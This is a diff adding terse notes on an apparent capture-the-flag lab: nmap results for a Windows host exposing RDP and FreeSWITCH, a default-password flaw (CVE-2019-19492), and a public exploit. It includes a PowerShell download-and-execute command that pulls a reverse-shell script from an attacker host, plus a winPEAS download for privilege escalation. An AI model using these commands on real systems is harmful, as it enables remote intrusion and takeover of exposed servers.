@@ -1,0 +1,71 @@
+NMAP:
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 08:36 EDT
+Nmap scan report for 10.10.172.70
+Host is up (0.053s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE          VERSION
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
+| Not valid before: 2022-09-18T12:35:30
+|_Not valid after:  2023-03-20T12:35:30
+|_ssl-date: 2022-09-19T12:39:16+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EOM4PK0578N
+|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
+|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
+|   DNS_Domain_Name: WIN-EOM4PK0578N
+|   DNS_Computer_Name: WIN-EOM4PK0578N
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-09-19T12:39:16+00:00
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: specialized
+Running (JUST GUESSING): AVtech embedded (87%)
+Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+We found from the metasploit module:
+
+- https://www.exploit-db.com/exploits/47698
+- https://nvd.nist.gov/vuln/detail/CVE-2019-19492
+
+That the freeswitch event_socket has a default password vulnerability:
+
+https://www.mageni.net/vulnerability/freeswitch-mod_event_socket-default-password-vulnerability-143230
+
+Trying to connect via telnet we can see the header:
+
+telnet 10.10.172.70 8021
+Trying 10.10.172.70...
+Connected to 10.10.172.70.
+Escape character is '^]'.
+-> Content-Type: auth/request
+
+
+Searching we found that we can authenticate with the command:
+
+auth <password>
+
+
+─$ searchsploit Freeswitch
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metasploit)                          | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                                             | windows/remote/47799.txt
+
+python3 47799.py 10.10.214.0 "powershell iex(new-object net.webclient).downloadstring('http://10.9.1.56:8000/Invoke-PowerShellTcp.ps1')"
+
+
+
+python3 47799.py 10.10.214.0 "powershell iex(new-object net.webclient).downloadstring('http://10.9.1.56:8000/Invoke-PowerShellTcp.ps1')"
+
+At C:\Users\Nekrotic\AppData\Local\Temp get winpeas:
+
+Invoke-WebRequest -Uri http://10.9.1.56:8000/winPEASx64.exe -OutFile winpea
+s.exe
+
